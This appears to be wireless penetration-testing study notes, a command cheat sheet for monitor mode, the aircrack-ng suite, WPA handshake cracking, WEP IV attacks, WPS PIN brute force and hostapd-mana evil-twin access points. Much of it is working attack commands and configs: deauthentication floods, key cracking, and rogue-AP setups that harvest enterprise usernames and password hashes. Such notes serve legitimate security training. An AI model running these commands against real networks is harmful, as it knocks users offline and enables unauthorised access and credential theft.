## Table of Contents
- [Wireless Drivers & Tools](#wireless-drivers--tools)
- [Connect to APs with wpa_supplicant](#connect-to-aps-with-wpa_supplicant)
  - [Open Networks](#open-networks)
  - [WPA Networks](#wpa-networks)
  - [WPA Enterprise Networks](#wpa-enterprise-networks)
- [Aircrack-ng Suite](#aircrack-ng-suite)
  - [Airmon-Ng](#airmon-ng)
  - [Airodump-Ng](#airodump-ng)
  - [Aireplay-ng](#aireplay-ng)
  - [Aircrack-Ng](#aircrack-ng)
  - [Airdecap-ng](#airdecap-ng)
- [Cracking Authentication Hashes](#cracking-authentication-hashes)
  - [Using John the Ripper](#using-john-the-ripper)
  - [Crunch to create a wordlist](#crunch-to-create-a-wordlist)
  - [hashcat](#hashcat)
  - [Airolib-ng](#airolib-ng)
  - [coWPAtty](#cowpatty)
- [WEP Attacks](#wep-attacks)
  - [Fake authentication](#fake-authentication)
  - [IV Cracking](#iv-cracking)
- [WPS Network Attacks](#wps-network-attacks)
  - [WPS Pin Attack](#wps-pin-attack)
- [Rogue APs](#rogue-aps)
  - [Airodump](#airodump)
  - [Wireshark](#wireshark)
  - [Creating Rogue AP](#creating-rogue-ap)
- [WPA Enterprise Attacks](#wpa-enterprise-attacks)
  - [PEAP](#peap)
  - [Rogue AP](#rogue-ap)
    
## Wireless Drivers & Tools 
| Command | Description |
|--|--|
|`sudo airmon-ng` | Display wireless drive and chipset 
|`sudo lsusb -vv` | Display wireless drive and chipset 
|`sudo iw list` | Display wireless devices and capabilities 
|`sudo iw dev wlan0 scan \| grep SSID` | List APs within range 
|`sudo iw dev wlan0 interface add wlan0mon type monitor` | Put our adapter into monitor mode. 
|`sudo iw link set wlan0mon up` | Bring up the interface 
|`sudo iw dev wlan0 info` | check we are in monitor mode.  
|`sudo iw dev wlan0 interface del` | Delete the monitor mode.  


## Connect to APs with wpa_supplicant 
### Open Networks 
```
network={
  ssid="AP-Name"
  scan_ssid=1
}
```
`sudo wpa_supplicant -i wlan0 -c wifi-client.conf`  

Once connected, request a DHCP lease.
`sudo dhclient wlan0`  

`ps aux | grep wpa_supplicant` kill pid once done.  

### WPA Networks  
```
network={
  ssid="home_network"
  scan_ssid=1
  psk="correct battery horse staple"
  key_mgmt=WPA-PSK
}
```

`sudo wpa_supplicant -i wlan0 -c wifi-client.conf`  

Once connected, request a DHCP lease.
`sudo dhclient wlan0`  

`ps aux | grep wpa_supplicant` kill pid once done.  `

### WPA Enterprise Networks 
```
network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```
`sudo wpa_supplicant -i wlan0 -c wifi-client.conf`  

Once connected, request a DHCP lease.
`sudo dhclient wlan0`  

`ps aux | grep wpa_supplicant` kill pid once done.  

## Aircrack-ng Suite
Aircrack-ng is a complete suite of tools to assess WiFi network security.  

### Airmon-Ng 
Airmon-ng is a convenient way to enable and disable monitor mode on various wireless interfaces.  

| Command | Description |
|--|--|
|`sudo airmon-ng` | Running airmon-ng without any parameters displays the status and information about the wireless interfaces on the system.|
|`sudo airmon-ng check`  |To check and see if any services will interfere with the wireless adapter: |
|`sudo airmon-ng check kill` |To kill processes that cause issues:   |
|`sudo airmon-ng start wlan0` | Put adapter into monitor mode. Creates an interface called `wlan0mon |
|`sudo airmon-ng start wlan0 3` | Start monitor mode on a specific channel. You only need to set a channel with tools that dont have the ability to set them such as `aireplay-ng` |
|`sudo iw dev` | List wireless adapaters and show types |
|`sudo iw dev wlan0mon info` | Confirm monitor mode and channel is correct |
|`sudo airmon-ng stop wlan0mon` | Take adapter out of monitor mode |
  
### Airodump-Ng 
Airodump-ng allows for us to start sniffing traffic if we have put our adapter in monitor mode already.  

| Command | Description |
|--|--|
|`sudo airodump-ng wlan0mon -c 2` | Capture traffic on channel 2 |
|`sudo airodump-ng wlan0mon -c 3 --bssid <MAC> -w cap1` | Sniff data from a specific AP on channel 3 and capture a cap1 file.  |
|`sudo airodump-ng wlan0mon -c 3 --bssid <MAC> --ivs wepivs` | Sniff data from a specific AP on channel 3 and capture WEP IVS file.  |
|`<space>` | Freeze the GUI duiring a capture. (Cature still runs in background)  |
|`<TAB>` | Scroll through the AP list. Can then use `UP` and `Down` arrows.  |
|`<A\|S\|M>` | `A` will cycle through display options. `S` cycles through sorting options. `M` cycles through colours if you wish to highlight a certain row.  |


|Field |	Description|
|--|--|
|BSSID |	The MAC address of the AP|
|PWR |	The signal level reported by the card, which will get higher as we get closer to the AP or station|
|RXQ |	Receive Quality as measured by the percentage of frames successfully received over the last 10 seconds|
|Beacons |	Number of announcement frames sent by the AP|
|# Data |	Number of captured data packets (if WEP, this is the unique IV count), including data broadcast packets|
|#/s |	Number of data packets per second measured over the last 10 seconds|
|CH |	Channel number taken from beacon frames. Note that sometimes frames from other channels are captured due to overlapping channels|
|MB |	Maximum speed supported by the AP. 11=802.11b, 22=802.11b+, up to 54 is 802.11g and anything higher is 802.11n or 802.11ac|
|ENC |	Encryption algorithm in use. OPN=no encryption, "WEP?"=WEP or higher (not enough data to choose between WEP and WPA/WPA2), |WEP=static or dynamic WEP, and WPA or WPA2 if TKIP or CCMP is present. WPA3 and OWE both require CCMP|
|CIPHER |	The cipher detected: CCMP, WRAP, TKIP, WEP, WEP40, or WEP104|
|AUTH |	The authentication protocol used. One of MGT (WPA/WPA2/WPA3 Enterprise), SKA (WEP shared key), PSK (WPA/WPA2/WPA3 pre shared key), or OPN (WEP open authentication)|
|ESSID |	The so-called SSID, which can be empty if the SSID is hidden|
  
### Aireplay-ng 
Aireply-ng used for creating traffic. Ability to do deauthentication attacks etc.

| Attacks | Description |
|--|--|
|0 | 	Deauthentication
|1 |	Fake Authentication
|2 	|Interactive Packet Replay
|3 	|ARP Request Replay Attack
|4 	|KoreK ChopChop Attack
|5 	|Fragmentation Attack
|6 |	Café-Latte Attack
|7 |Client-Oriented Fragmentation Attack
|8 |	WPA Migration Mode Attack
|9 |	Injection Test

Performing a deauthentication attack.
| De-auth | Description |
|--|--|
| `sudo airmon-ng start wlan0 3`| Set card to correct channel  
| `sudo aireplay-ng -9 wlan0mon` | Check if we can inject `-9` (30-frame test to check connection quality). This will report back success rate for injection attacks.  
| `sudo aireplay-ng -9 -e AP-name -a <BSSID-MAC> wlan0mon`| Injection against speciffic ESSIDE (-e) and BSSID. Again performing checks against specific target AP.    
| `sudo aireplay-ng --deauth 1000 -a <AP-BSSID> -c <CLIENT-MAC> wlan0mon`| Deauthenticate a certain client from the target AP. 1000 deauth packets.
                                           

### Aircrack-Ng 
Aircrack-ng. It can crack WEP and WPA/WPA2 networks that use pre-shared keys or PMKID.  
Aircrack-ng is considered an offline attack since it works with packet captures and doesn't require interaction with any Wi-Fi device.  

| Command | Description |
|--|--|
|`sudo aircrack-ng -S` | Benchmark CPU cracking performance (15 second test) |

### Airdecap-ng  
This is used after we have got the wireless key to a network.  
It allows us to decrypt WEP,WPA, WPA2 capture files.  

| Command | Description |
|--|--|
|`sudo airdecap-ng -b BSSID-AP cap-file.cap` | Info on capture file |

## Cracking Authentication Hashes
WiFi Protected Access (WPA|WPA2|WPA3) use either Pre-Shared Keys (PSK) or Enterprise for authentication.  

1. Capture a WPA 4-way handshake  
- Monitor mode 
- Airodump target the AP and ensure it's using PSK for Auth.  Note a client MAC  
- Save information to a capture file.  Leave running.  
`airodump-ng wlan0mon -c 3 --bssid <AP-MAC> -w wpa`  
- Deauthenticate a target
`sudo aireplay-ng -0 1 -a <AP-MAc> -c <client-MAC> wlan0mon`  
- Check if airodump captured a `WPA handshake: <MAC>`  
- If no handshake captured = maybe too far or close to AP. Or the clients wireless driver dismisses directed deauthentication, and only deauths from broadcasts. If that's the case, de-auth without `-c`. This may knock everything offline though temporarily! It may also be that you needed to wait for a client to connect if `802.11w` is in use!

2. Crack the handshake  
`aircrack-ng -w /wordlist.txt -e AP-Name -b <AP-MAC> wpa-01.cap`

3. Confirm correct key  
`airdecap-ng -b <AP-MAC> -e AP-Name -p key wpa-01.cap`  
This should list 'decrypted packets'.   

### Using John the Ripper 
Creating custom rules for wordlist attacks (some APs use default password strings like 8 integers)

`nano /etc/john/john.conf`  

Add 2 numbers to the end of each password:
```
$[0-9]$[0-9]
$[0-9]$[0-9]$[0-9]
```
Test the rules with JTR:  
`john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123`  

Use john with aircrack-ng:  
`john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap`  

### Crunch to create a wordlist  
Crunch can be used to create wordlists with only certain characters.

`crunch 8 9 abc123`   

| Crunch Options | Description |
|--|--|
|@ | represents lowercase characters or characters from a defined set
|, |represents uppercase characters
|% |represent numbers
|^ |represents symbols

`crunch 11 11 -t password%%%` = password000  

### hashcat 
Convert capture file to HCCAPx file for cracking.  
`/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx` 

`hashcat -m 2500 output.hccapx wordlist.txt`  

### Airolib-ng 
Used to manage ESSID and password lists, and compute their Pairwise Master Keys (PMK).  

These can be used to crack WPA and WPA 2 PSK passphrases.  

1. Create a file containing ESSID of target AP: `echo AP-Name > essid.txt` 
2. create or import airolib-ng database: `airolib-ng AP-Name.sqlite --import essid essid.txt`  
3. Import wordlist: `airolib-ng AP-Name.sqlite --import passwd /usr/share/john/password.lst`
4. Process PMKs: `airolib-ng AP-Name.sqlite --batch` && `airolib-ng AP-Name.sqlite --stats`
5. Crack the precomputated PMKs: `aircrack-ng -r AP-Name.sqlite capfile.cap`

### coWPAtty 
rainbow tables

`genpmk -f /usr/share/john/password.lst -d output-file.txt -s AP-Name`

## WEP Attacks  
### IVS Cracking 
| Command  | Description |
|--|--|
| `airmon-ng start wlan0` | Fake Authentication with Shared Key Authentication
| `sudo airodump-ng wlan0mon --encrypt WEP` | check for WEP networks
| `sudo airodump-ng wlan0mon --ivs -c 3 --bsside <AP-MAC> -w ivs-capture-file ` | capture IVS from specific AP  
| `sudo aircrack-ng ./ivs-capture-file.cap ` | crack key  
If not getting a lot of Data packets, nothing connected or communicating to AP. Connect with Fake Authentication Attack.  

### Fake authentication 
Used when no clients connected to AP and you need an associated MAC address for attacking. 
| Command  | Description |
|--|--|
| `aireplay-ng -1 0 -e AP-NAME -a <AP-MAC> -h <Our Cards MAC> -y sharedkeyxor wlan0` | Fake Authentication with Shared Key Authentication
| `aireplay-ng -1 0 -e AP-NAME -a <AP-MAC> -h <Our Cards MAC>  wlan0` | Fake Authentication against open networks

### ARP Replay Attack.
With connection via fake authentication, we can use ARP replay attack to generate traffic to capture data packets (IVS).
| Command  | Description |
|--|--|
| `aireplay-ng -3 -b <AP-MAC>  wlan0` | Once receive ARP request, will replay it to the target, increasing data packets.

### Besside-ng 
Automate the above using besside-ng.  
`besside-ng wlan0 -c3 -b <AP-MAC>`.  This will inject and flood the AP to obtain IVs saving to a file.  

## WPS Network Attacks 
Wi-Fi Protected Setup (WPS) allows for sharing WPA and WPA2 passphrases securely.  
- Registrar - Configures Enrollees to join the network  
- Enrollee - Device wanting to join the network.  

Methods for access: 
- Pushing a button
- Entering a PIN  
- NFC  
- USB  

### WPS Pin Attack 
Pins are typically 8 characters long with the last number being a checksum.  
8 messages are sent between the registrar and enrollee during authentication, as M1-M8. 

If the first 4 digits are correct, then M5 is transmitted. If not, we know the first 4 digit combo is wrong. There's 10,000 possible combinations here.  

Next, if the remaining 3 digitis (we exclude the cheksum) are invalid, then M7 is not sent.  

Attack:  
1. Monitor Mode.
2. Use tool wsh to get WPS info about the AP.  
3. Use tool reaver to attack the AP.

| Command  | Description |
|--|--|
| `wash -i wlan0mon -s` | List WPS info on nearby APs  
| `reaver -b <AP-MAC> -i wlan0mon -v -K` | `Pixie Dust Attack` Pin attack against target AP. May need to specifyu channel with `-c`
| `reaver -b <AP-MAC> -i wlan0mon -v -d 1 -r 5:3 -c 3` | `Online Brute Force Attack` Pin attack against target AP. 

## Rogue APs  
An AP being used that has not been authorized by the network Admin.  

- An AP plugged into the network without an admins knowledge
- Maliciously-controlled AP that mimics an Approved AP.  

When clients connect to networks they stored the network in a list called Preferred Network List (PNL).  
This allows clients to reconnect to known networks when in range.  
When clients move around large areas or offices, several AP's with the same ESSID are used, allwoing the client to connect to new ones.  

The rogue AP will advertise the same ESSID as an existing AP, as well as encryption types used, and will broadcast a stronger signal making it more likely the client will connect to us over the existing one.  

Clients connecting to the rogue AP will give us 2 out of the 4 parts of the 4-way handshake, enough to attempts to crack the PSK.  

### Airodump
Enumerate AP info with airodump 
| Command  | Description |
|--|--|
| `airmon-ng start wlan0` | Enter monitor mode
| `airodump-ng wlan0mon -w discovery --output-format pcap` | Enumerate APs and save a pcap. Make note of target AP, ENC, and Cipher info.  

### Wireshark 
As airmon-ng reports only the highest levels of encryption supported, we use Wireshark to enumerate others that may be supported as well.  

| Wireshark Filter  | Description |
|--|--|
| `wlan.fc.type_subtype == 0x08` | Display beacon packets . Beacon = 8. Management = 0.  
| `&& wlan.ssid == "AP-Name"` | Only target the desired AP 

PSK  
CCM 
WPS  

### Creating Rogue AP  
`hostapd-mana` - Tool for creating a Rogue AP.  
`sudo apt install hostapd-mana`  

1. Build a config file. `nano AP-Name.conf`
```
interface=wlan0
ssid=AP-Name 
channel=3
hw_mode=g
ieee80211n=1  
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYTHING
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/outputfile.hccapx
``` 

| Options | Description |
|--|--|
| `hw_mode=g` | 2.4GHz
| `hw_mode=a` | 5GHz
| `ieee80211n` |change from default `802.11b` to `802.11n`
| `wpa=1` |WPA only
| `wpa=2` |WPA2 only
| `wpa=3` |WPA1 and WPA2 support
| `wpa_key_mgmt=WPA-PSK` | Setting PSK Authentication  
| `wpa_passphrase=ANYTHING` | Passphrase irrelevant when trying to capture handshake only. 
| `wpa_pairwise=TKIP CCMP` | Enable TKIP/CCMP Encryption for WPA1     
| `rsn_pairwise=TKIP CCMP` | Enable TKIP/CCMP Encryption for WPA2     
| `mana_wpaout=/outputfile.hccapx` | Save captured handshaked to file.  

2.Start the rogue AP  
`hostapd-mana AP-Name.conf` 

Client will connect. (de-auth) and ensure stronger signal.  
We can capture the handshake.  

3. Crack Handshake with Hashcat or aircrack-ng  
`aircrack-ng outfile.hccapx -e AP-Name -w /wordlist.txt`  

## WPA Enterprise Attacks 
User authentication against a central database.  #

WPA Enterprise uses Extensible Authentication Protocol (EAP) allowing for different authentication schemes or methods.  

Authentication with RADIUS 
- EAP-TLS Requires a certificate  
- EAP-TTLS - Not necessarily using a client certificate.  (creates a tunnel and then using CHAP or PAP to exchange credentials)  
- PEAP Differs on hown data is exchanged in the tunnel.  

### PEAP 
Protection Extensible Authentication Protocol (PEAP)  

- Beacon Frame (WPA or WPA2 in use and check ciphers)
- Association frame - Auth Key Manmagement to suggest Enterprise 
- Several EAP frame to handle authentication. Can identify `identity` followed by domain\username
- After identitiy provided, next frame shows if PEAP or TLS etc.  

### Rogue AP 
Rogue AP to match settings as closely as possible.  https://github.com/sensepost/hostapd-mana/wiki/Creating-PSK-or-EAP-Networks  
freeradius (open source RADIUS server) to generate a certificate.  

1. Monitor Mode.  `airmon-ng start wlan0`
2. `airodump-ng wlan0mon` = Note Channel, BSSID, and AUTH saying MGT (Enterprise) 
3. `sudo airodump-ng wlan0mon -c 3 --bssid <AP-MAC> -w cap1`
4. De-authenticate clients and capture a handshake & certificate `sudo aireplay-ng -0 1 -a <AP-MAc> -c <client-MAC> wlan0mon`
5. Stop the dump and leave monitor mode. `airmon-ng stop wlan0`
6. Open capture file in wireshark and filter 
`wlan.bssid==<AP-MAC && eap && tls.handshake.certificate`
7. Packet Details>Extensible Authentication Protocol>Transport Layer Security>TLS1.2 Record Layer: Handshake Protocol: Certificate>certificates
8. Every certificate right-click Export Packet Bytes and save as .der extension. Check contents of certificate with `openssl x509 -inform der -in cert.der -text`
9. Convert certificates into PEM format. `openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt`
10. using `freeradius` generate certificates similar to what we captured. `cd /etc/freeradius/3.0/certs`
11. nano ca.cnf 
12. Edit certificate to look similar to real one.  
13. nano server.cnf 
14. Edit server to match target server certificate.  
15. Build the certs. `rm dh` `make`
16. Delete certs if already there `make delete certs`
17. Edit `hostapd-mana` for rogue ap settings - `nano /etc/hostapd-mana/mana.conf` 
18. Make same SSID as target AP  
19. Create host eap mana file `nano /etc /hostapd-mana/mana.eap_user`
```
*		PEAP,TTLS,TLS,MD5,GTC
"t"     	TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  "1234test"  [2]
```
21. First column * indicates any user. You can specfy a user and domain here.  
22. Start hostapd-mana `hostapd-mana /etc/hostapdmana/mana.conf`
23. After a host connects, you will see a username and password hash
24. `aireplay-ng -0 100 -a <Ap-MAC> wlan0 --ignore-negative-one`

### hostapd-mana configs
#### EAP networks
##### mana-config
```
interface=wlan1 #second card not in monitor mode
ssid=SSID
hw_mode=g
channel=1
auth_algs=3
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
ieee8021x=1
eap_server=1
eap_user_file=hostapd.eap_user
ca_cert=/ca.pem
server_cert=/server.pem
private_key=/server.key
dh_file=/dhparam.pem
mana_wpe=1
mana_eapsuccess=1
mana_credout=hostapd.creds
```
##### Diffie-Helman 
`openssl dhparam 2048 > dhparam.pem`
##### keys
```
openssl genrsa -out server.key 2048
openssl req -new -sha256 -key server.key -out csr.csr
openssl req -x509 -sha256 -days 365 -key server.key -in csr.csr -out server.pem
ln -s server.pem ca.pem
```

#### WPA/2 Pre-Shared Keys (PSK Networks)
```
interface=wlan0
ssid=PSKNet
channel=6
hw_mode=g
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=ASecurePassword
auth_algs=3
```

Attempt decrypt:
Copy and paste mana output where it says `asleap -C MAC -R MAC` and add wordlist to this.

`asleap -C MAC -R MAC -W /wordlist.txt` 

Automate using crackapd - which monitors and repeatedly tries asleap. if successful addes users to hostapd-mana users file.  

You may need to keep deauthenticating users to get a connection.  
